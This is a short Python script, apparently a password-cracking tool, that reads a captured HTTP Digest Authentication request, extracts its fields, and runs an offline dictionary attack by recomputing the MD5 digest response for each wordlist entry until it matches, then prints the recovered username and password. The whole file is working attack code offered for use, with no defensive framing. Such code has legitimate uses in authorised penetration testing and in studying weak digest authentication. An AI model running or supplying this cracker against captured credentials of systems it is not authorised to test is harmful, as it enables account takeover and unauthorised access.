import sys,re,argparse
from hashlib import md5

parser = argparse.ArgumentParser()
parser.add_argument("--wordlist",help="Password wordlists",required=False)
parser.add_argument("--request",help="Request http headers",required=True)
args = parser.parse_args()

wordlist = args.wordlist
require = args.request

wordlists = re.findall('\w+', open(wordlist, encoding='latin-1').read().lower())

with open(args.request, 'r') as f:
    req = f.read()
    username = re.compile(r'username="(\w*)"')
    realm = re.compile(r'realm="(\w*)"')
    nonce = re.compile(r' nonce="([\w/=]*)"')
    uri = re.compile(r' uri="([\w/]*)"')
    algorithm = re.compile(r'algorithm=([A-Z0-9]+)')
    response = re.compile(r' response="([\w/]*)"')
    qop = re.compile(r' qop=([\w/]*)')
    nc = re.compile(r' nc=([\w/]*)')
    cnonce = re.compile(r' cnonce="([\w/]*)"')
    method = re.compile(r'([A-Z]+) ')

    username = username.findall(req)[0]
    realm = realm.findall(req)[0]
    nonce = nonce.findall(req)[0]
    uri = uri.findall(req)[0]
    algorithm = algorithm.findall(req)[0]
    response = response.findall(req)[0]
    qop = qop.findall(req)[0]
    nc = nc.findall(req)[0]
    cnonce = cnonce.findall(req)[0]
    method = method.findall(req)[0]

for password in wordlists:
    h1 = (username+":"+realm+":"+password)
    ha1 = (md5(h1.encode("utf-8")).hexdigest())

    h2 = (method+":"+uri)
    ha2 = (md5(h2.encode("utf-8")).hexdigest())

    resp = (ha1+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+ha2)
    response2 = (md5(resp.encode("utf-8")).hexdigest())

    if response2 == response:
        print("[+] username: %s" % (username))
        print("[+] password: %s" % (password))
        sys.exit(0)